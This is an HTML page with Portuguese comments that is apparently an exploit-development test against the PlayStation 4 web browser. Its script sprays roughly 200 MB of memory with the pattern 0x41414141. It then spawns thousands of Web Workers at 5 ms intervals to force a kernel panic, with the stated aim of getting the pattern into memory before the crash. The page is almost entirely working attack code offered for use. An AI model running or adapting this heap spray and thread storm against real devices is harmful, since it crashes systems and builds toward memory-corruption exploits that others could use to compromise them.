<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 Kernel Heap Spray Test</title>
    
</head>
<body>

    <h1>Kernel Heap Spray + Thread Stress</h1>
    <p>Objetivo: Injetar 0x41414141 na memória antes do Kernel Panic.</p>

    <div class="section">
        <button onclick="startHeapSpray()">1. Iniciar Heap Spray (Carregar RAM)</button>
        <button onclick="runRedZoneBypass()" style="border-color: red; color: red;">2. Disparar Thread Panic</button>
    </div>

    <div id="status">Aguardando...</div>
    <div id="log"></div>

    <script>
        // --- CONFIGURAÇÃO DO SPRAY ---
        // Padrão que queremos ver no dump de erro (0x41 = 'A')
        const SPRAY_PATTERN = 0x41414141; 
        // Tamanho de cada bloco (1MB)
        const BLOCK_SIZE = 1024 * 1024; 
        // Quantidade de memória para tentar alocar (aprox 500MB)
        // O WebKit do PS4 tem limite, se travar antes do botão 2, diminua isso.
        const SPRAY_SIZE_MB = 200; 

        var sprayStore = [];

        function log(msg) { 
            const el = document.getElementById('log');
            const st = document.getElementById('status');
            const time = new Date().toLocaleTimeString();
            el.innerHTML = `<div>[${time}] ${msg}</div>` + el.innerHTML;
            st.innerText = msg;
        }

        // --- PASSO 1: HEAP SPRAY ---
        // Tenta preencher "buracos" na memória do Kernel/Userland com nosso padrão.
        function startHeapSpray() {
            log("Iniciando Heap Spray... (Isso pode travar o navegador por alguns segundos)");
            
            setTimeout(() => {
                try {
                    for (let i = 0; i < SPRAY_SIZE_MB; i++) {
                        // Cria um ArrayBuffer de 1MB
                        let buffer = new ArrayBuffer(BLOCK_SIZE);
                        let view = new Uint32Array(buffer);
                        
                        // Preenche com 0x41414141
                        for (let j = 0; j < view.length; j++) {
                            view[j] = SPRAY_PATTERN;
                        }
                        
                        // Salva referência global para o Garbage Collector não limpar
                        sprayStore.push(view);
                        
                        if(i % 50 === 0) log(`Alocados ${i} MB...`);
                    }
                    log(`SUCESSO: Heap Spray Finalizado. ~${SPRAY_SIZE_MB}MB alocados com 0x41414141.`);
                    log("Agora a memória está 'suja' com nosso padrão. Pode disparar o Panic.");
                } catch (e) {
                    log("ERRO no Spray (Memória cheia?): " + e.message);
                }
            }, 100);
        }

        // --- PASSO 2: O SEU TRIGGER (MODIFICADO) ---
        function runRedZoneBypass() {
            log("[KERNEL] Iniciando Thread Storm...");
            
            // Worker agressivo (deep 10)
            const workerCode = `
                function deep(n) {
                    // Tenta alocar na stack para forçar movimento de memória
                    const v = new Float64Array(32); 
                    if (n > 0) deep(n-1);
                }
                deep(10); 
                postMessage("Done");
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            let count = 0;
            // Aumentei ligeiramente a frequência para garantir colisão com o Spray
            const interval = setInterval(() => {
                for(let i=0; i<30; i++) {
                    new Worker(url).onmessage = () => {};
                }
                count += 30;
                
                // Feedback visual mínimo para não atrasar o JS
                if(count % 500 === 0) {
                    document.getElementById('status').innerText = "Threads criadas: " + count;
                }

                if(count > 5000) {
                    clearInterval(interval);
                    log("Stress test finalizado (se o console não desligou, tente de novo).");
                }
            }, 5); // 5ms para ser ainda mais agressivo
        }
    </script>
</body>
</html>


